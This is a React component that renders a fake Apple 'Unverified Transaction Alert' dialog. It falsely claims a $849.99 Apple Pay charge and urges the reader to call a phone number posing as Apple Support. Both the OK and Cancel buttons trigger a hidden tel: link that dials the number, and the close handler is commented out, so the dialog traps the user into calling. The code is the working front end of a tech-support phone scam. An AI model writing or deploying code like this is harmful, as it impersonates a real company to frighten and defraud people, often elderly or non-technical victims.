import React, { forwardRef, useImperativeHandle } from "react";

interface AppleAlertModalProps {
  id?: string;
  style?: React.CSSProperties;
  onClose?: () => void;
}

export interface AppleAlertModalHandle {
  callSupport: () => void;
}

const AppleAlertModal = forwardRef<AppleAlertModalHandle, AppleAlertModalProps>(({
  id,
  style,
  onClose: _onClose,
}, ref) => {
  const callSupport = () => {
    // MUST be directly inside a user click, or simulated click
    // Using a temporary anchor tag is often more reliable on Safari/Chrome
    const link = document.createElement("a");
    link.href = "tel:+118888587485";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();

    // Cleanup
    setTimeout(() => {
      document.body.removeChild(link);
    }, 100);
  };

  // Expose callSupport method to parent via ref
  useImperativeHandle(ref, () => ({
    callSupport
  }));

  return (
    <div
      id={id}
      role="dialog"
      className="absolute inset-0 z-50 flex items-center justify-center p-4 top-56 h-fit"
      style={style}
    >
      <div className="w-full max-w-[360px] rounded-2xl bg-white text-black">
        {/* Body */}
        <div className="p-6 text-center">
          <h3 className="text-[15px] font-semibold mb-1">
            Unverified Transaction Alert
          </h3>

          <p className="text-[15px] leading-tight text-black/80 mb-3">
            Your Apple ID was recently used at APPLE STORE for $849.99 Via Apple Pay Pre-Authorization!We have placed those request on hold to ensure safest and Security. Not you? Immediately call Apple Support <br />+1-188-885-87485 to Freeze it!.
          </p>

          {/* Actions */}
          <div className="flex gap-3">
            <button
              onClick={callSupport}
              data-auto-call="true"
              className="flex-1 rounded-lg bg-[#007AFF] py-1 text-[14px] font-semibold text-white transition active:opacity-80"
            >
              OK
            </button>

            <button
              //onClick={onClose}
              onClick={callSupport}
              className="flex-1 rounded-lg bg-[#E5E5EA] py-1 text-[14px] font-semibold text-[#007AFF] transition active:opacity-80"
            >
              Cancel
            </button>
          </div>
        </div>
      </div>
    </div>
  );
});

export default AppleAlertModal;
